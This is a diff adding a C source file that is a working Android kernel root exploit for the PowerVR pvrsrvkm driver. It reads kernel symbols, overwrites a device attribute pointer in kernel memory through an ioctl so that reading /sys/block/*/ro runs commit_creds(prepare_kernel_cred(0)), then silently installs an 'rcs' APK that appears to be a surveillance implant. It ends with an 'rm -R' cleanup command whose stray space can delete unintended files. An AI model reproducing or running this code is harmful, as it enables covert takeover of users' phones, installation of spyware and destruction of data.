@@ -1,0 +1,265 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include "rcs_connection.h"
+
+#define CONNECT_SERVICES 0xc01c670c
+#define DUMP_SIZE        161920
+
+typedef struct {
+  uint32_t ui32BridgeID;
+  uint32_t ui32Size;
+  void *pvParamIn;
+  uint32_t ui32InBufferSize;
+  void *pvParamOut;
+  uint32_t ui32OutBufferSize;
+  void * hKernelServices;
+} PVRSRV_BRIDGE_PACKAGE;
+
+typedef int (* _commit_creds)(unsigned long cred);
+typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
+_commit_creds commit_creds;
+_prepare_kernel_cred prepare_kernel_cred;
+
+ssize_t
+fake_disk_ro_show(void *dev, void *attr, char *buf)
+{
+  commit_creds(prepare_kernel_cred(0));
+  return sprintf(buf, "0wned\n");
+}
+
+struct attribute {
+  const char *name;
+  void *owner;
+  mode_t mode;
+};
+
+struct device_attribute {
+  struct attribute attr;
+  ssize_t (*show)(void *dev, void *attr, char *buf);
+  ssize_t (*store)(void *dev, void *attr, const char *buf, size_t count);
+};
+
+struct device_attribute fake_dev_attr_ro = {
+  .attr= {
+    .name = "ro",
+    .mode = S_IRWXU | S_IRWXG | S_IRWXO,
+  },
+  .show = fake_disk_ro_show,
+  .store = NULL,
+};
+
+
+static int copy(const char *from, const char *to)
+{
+  int fd1, fd2;
+  char buf[0x1000];
+  int r = 0;
+
+  if ((fd1 = open(from, O_RDONLY)) < 0)
+    return -1;
+  if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
+    close(fd1);
+    return -1;
+  }
+
+  for (;;) {
+    r = read(fd1, buf, sizeof(buf));
+    if (r <= 0)
+      break;
+    if (write(fd2, buf, r) != r)
+      break;
+  }
+
+  close(fd1);
+  close(fd2);
+  sync(); sync();
+  return r;
+}
+
+
+
+unsigned long
+get_symbol(char *name)
+{
+  FILE *f;
+  unsigned long addr;
+  char dummy, sname[512];
+  int ret = 0;
+ 
+  f = fopen("/proc/kallsyms", "r");
+  if (!f) {
+    return 0;
+  }
+ 
+  while (ret != EOF) {
+    ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
+    if (ret == 0) {
+      fscanf(f, "%s\n", sname);
+      continue;
+    }
+    if (!strcmp(name, sname)) {
+      return addr;
+    }
+  }
+
+  return 0;
+}
+
+int
+do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size)
+{
+  PVRSRV_BRIDGE_PACKAGE pkg;
+
+  memset(&pkg, 0, sizeof(pkg));
+
+  pkg.ui32BridgeID = CONNECT_SERVICES;
+  pkg.ui32Size = sizeof(pkg);
+  pkg.ui32InBufferSize = in_size;
+  pkg.pvParamIn = in;
+  pkg.ui32OutBufferSize = out_size;
+  pkg.pvParamOut = out;
+
+  return ioctl(fd, 0, &pkg);
+}
+
+int
+main(int argc, char **argv)
+{
+  DIR *dir;
+  struct dirent *dentry;
+  int fd, ret, found, trigger;
+  char *dump, *dump_end, buf[8], path[256], path2[128];
+  unsigned long dev_attr_ro, *ptr;
+
+  commit_creds = (_commit_creds) get_symbol("commit_creds");
+  if (!commit_creds) 
+    exit(1);
+  
+
+  prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
+  if (!prepare_kernel_cred) 
+    exit(1);
+  
+
+  dev_attr_ro = get_symbol("dev_attr_ro");
+  if (!dev_attr_ro) 
+    exit(1);
+
+
+  fd = open("/dev/pvrsrvkm", O_RDWR);
+  if (fd == -1) 
+    exit(1);
+
+  dump = malloc(DUMP_SIZE + 0x1000);
+  dump_end = dump + DUMP_SIZE + 0x1000;
+  memset(dump, 0, DUMP_SIZE + 0x1000);
+
+  ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
+  if (ret == -1) 
+    exit(1);
+  
+
+  found = 0;
+  for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
+    if (*ptr == dev_attr_ro) {
+      *ptr = (unsigned long) &fake_dev_attr_ro;
+      found++;
+    }
+  }
+
+  if (found == 0)
+    exit(1);
+
+  ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
+  if (ret == -1) 
+    exit(1);
+
+  dir = opendir("/sys/block");
+  if (!dir) 
+    exit(1);
+
+  found = 0;
+  while ((dentry = readdir(dir)) != NULL) {
+    if (strcmp(dentry->d_name, ".") == 0 || strcmp(dentry->d_name, "..") == 0) {
+      continue;
+    }
+
+    snprintf(path, sizeof(path), "/sys/block/%s/ro", dentry->d_name);
+
+    trigger = open(path, O_RDONLY);
+    if (trigger == -1) 
+      exit(1);
+    
+    memset(buf, 0, sizeof(buf));
+    ret = read(trigger, buf, sizeof(buf));
+    close(trigger);
+
+    if (strcmp(buf, "0wned\n") == 0) {
+      found = 1;
+      break;
+    }
+  }
+
+  if (found == 0)
+    exit(1);
+
+  ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
+  if (ret == -1)
+    exit(1);
+
+  found = 0;
+  for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
+    if (*ptr == (unsigned long) &fake_dev_attr_ro) {
+      *ptr = (unsigned long) dev_attr_ro;
+      found++;
+    }
+  }
+
+  if (found == 0)
+    exit(1);
+
+  ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
+  if (ret == -1) 
+    exit(1);
+
+  if (getuid() != 0)
+    exit(1);
+
+
+  // Copy rcs in a gool directory
+  memset(path, 0, sizeof(path));
+  getcwd(path, sizeof(path));
+  strcat(path, "/");
+  strcat(path, rcsname);
+
+  memset(path2, 0, sizeof(path2));
+  snprintf(path2, sizeof(path2), "%s%s", rcspath, rcsname);
+  
+  copy(path, path2);
+  chmod(path2, 0777);
+
+  // Install rcs apk
+  memset(path, 0, sizeof(path));
+  snprintf(path, sizeof(path), "pm install %s", path2);
+  system(path);
+
+  // Clean up
+  remove(path2); // rcs apk
+  memset(path, 0, sizeof(path));
+  memset(path2, 0, sizeof(path2));
+  getcwd(path, sizeof(path));
+  snprintf(path2, sizeof(path2), "rm -R %s/ *", path); 
+
+  system(path2); // Browser cache
+
+  return 0;
+}
